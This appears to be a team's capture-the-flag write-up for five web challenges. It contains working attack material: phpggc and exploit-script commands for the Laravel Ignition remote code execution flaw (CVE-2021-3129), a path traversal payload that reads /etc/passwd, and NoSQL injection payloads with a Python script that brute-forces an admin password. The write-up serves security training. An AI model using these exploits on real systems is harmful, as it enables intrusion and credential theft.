# Web

## Inspector gadget

> Solved by: Bobby sox and ava

* Visiting the webpage we see a part of a flag: CHTB{

* If we keep looking around the pages, we find in /static/js/main another part of the flag:

```
us3full_1nf0rm4tion}
```

* This in combination with the flag on the website is not the correct flag so far.
* static/css/main.css has another potential hint at the top with: c4n_r3ve4l_ 
* so, so far we have collected 3 pieces of a flag:

```
1. CHTB{
2. us3full_1nf0rm4tion}
3. c4n_r3ve4l_ 
```

* in js.main we will also find the last piece of our flag:1nsp3ction_
* the full flag ended up being :`CHTB{1nsp3ction_c4n_r3ve4l_us3full_1nf0rm4tion}`

## Cass

> Solved by : thewhiteh4t

* Input sanitization is only in front end via javascript
* we can use burpsuite to bypass that

![](https://i.imgur.com/BSK49kM.png)

---

## DAAS

> Solved by: Nigamelastic

* The hint for this challenge talks about being stuck in debug.
* Some research shows there is a CVE for this, and the Laravel version were working with is vulnerable.
* https://www.exploit-db.com/exploits/49424
* https://www.youtube.com/watch?v=gr8ZKQpYiug&

**CVE-2021-3129** : https://nvd.nist.gov/vuln/detail/CVE-2021-3129

* Find 

```
ip/_ignition/execute-solution
```

* For a laravel panel with error messages and stack trace. 

![](https://i.imgur.com/bwswVCZ.jpg)

* https://www.ambionics.io/blog/laravel-debug-rce
* As mentioned in the blog above i tried performing a post request but it gave me a 302 response
* but the above link mentions their github page and exploit which is
`https://github.com/ambionics/phpggc`
and 
`https://github.com/ambionics/laravel-exploits`

the idea is to get the phar file with ur custom command from 1st repo and then put the phar file into the exploit with specified url to run the exploit
**PS: for a linux command with spaces simply use** `"` 

* so for our case since we know the flag was found on the root directory and its name as 

```
flagM1AhS
```

* our phpggc command should be

```bash
php -d'phar.readonly=0' ./phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system "cat /flagM1AhS"
```

* run that in the exploit as:

```bash
./laravel-ignition-rce.py http://165.227.234.7:31636/ /tmp/exploit.phar
```

* and we have the flag:

```
CHTB{wh3n_7h3_d3bu663r_7urn5_4641n57_7h3_d3bu6633}
```

---

## MiniSTRyplace

> Solved by: Bobbysox and thewhiteh4t

* hint1: “Let's read this website in the language of Alines. Or maybe not?
This challenge will raise 33 euros for a good cause.”
* hint2: The challenges name is “miniSTRyplace”. This is a play on words for str_replace.
* We see right away that we can change language and it is represented:
`ip.address/?lang=es.php` a perfect place to try LFI

* In order to prevent path traversal, developers can implement blacklisting. It will usually look something like this:

```
$language = str_replace('../', '', $_GET['language']);
```

* This is where you can see the name of the challenge was a hint to the sec measures used.
*now we can modify our final payload to bypass blacklisting:

```
http://46.101.77.180:32490/?lang=....//....//....//....//....//....//....//....//etc/passwd
```

* Our exploit is successful, to get the flag we just used the following :

```
http://165.227.234.7:30779/?lang=....//....//flag
```

---

## Wild Goose Hunt

> Solved by : thewhiteh4t

* We have a cool login page and source of the web app for this one
* entrypoint.sh contains the following :

```bash
    #!/bin/ash
    
    # Secure entrypoint
    chmod 600 /entrypoint.sh
    mkdir /tmp/mongodb
    mongod --noauth --dbpath /tmp/mongodb/ &
    sleep 2
    mongo heros --eval "db.createCollection('users')"
    mongo heros --eval 'db.users.insert( { username: "admin", password: "CHTB{f4k3_fl4g_f0r_t3st1ng}"} )'
    /usr/bin/supervisord -c /etc/supervisord.conf
```

* we can see that the flag is being stored as the password of admin
* we need to somehow extract the password
* since its mongoDB first assumption was to check for NoSQL injection
* Here is the error message we get in burp for a normal attempt

![](https://i.imgur.com/P2my3g3.png)

* Lets switch to repeater here

![](https://i.imgur.com/miWWAps.png)

* so we are getting a json response and the message is being displayed in the frontend
* next i tried some basic payloads for NoSQL injection

```
username[$ne]=lol&password[$ne]=lol
```

![](https://i.imgur.com/H6Da6q7.png)

* Authentication bypassed! but we dont get any functionality in the frontend so i proceeded with more payloads

```
username=admin&password[$regex]=A*
```

![](https://i.imgur.com/NCoQigL.png)

* This is an interesting payload because we can use a wildcard to check if a particular character is present in the password or not! 
* we know that the flag is the password and flag begins with `CHTB{` so I tried that next

```
username=admin&password[$regex]=CHTB{.*
```

![](https://i.imgur.com/6ya2cBg.png)

* And it works again!
* Now we can bruteforce characters and check for success message to get correct characters
* I created a small python script for it

```python
    #!/usr/bin/env python3
    #################################
    ## Author    : thewhiteh4t ######
    ## Challenge : Wild Goose Hunt ##
    #################################
    import json
    import requests
    ip = '138.68.187.25'
    port = 31370
    url = f'http://{ip}:{port}/api/login'
    flag = 'CHTB{'
    charset = '_01234abcdefghijklmnopqrstuvwxyz'
    loop_iter = 1
    while flag.endswith('}') == False:
        for char in charset:
            if loop_iter == 1:
                payload = flag + char + '.*'
            else:
                payload = flag + '}'
            data = {
                'username': 'admin',
                'password[$regex]': payload
            }
            try:
                rqst = requests.post(url, data=data)
            except Exception as e:
                print(f'[-] Exception : {e}')
                exit()
            if rqst.status_code == 200:
                resp = rqst.text
                json_resp = json.loads(resp)
                status = json_resp['logged']
                if status == 1:
                    if payload.endswith('}') == False:
                        flag = payload.replace('.*', '')
                    else:
                        flag = payload
                        print(f'FLAG : {flag}')
                        exit()
                    print(f'FLAG : {flag}')
                    loop_iter = 0
                    break
            else:
                print(f'[-] Error : {rqst.status_code}')
        loop_iter += 1
```

![](https://i.imgur.com/6L20wKy.png)
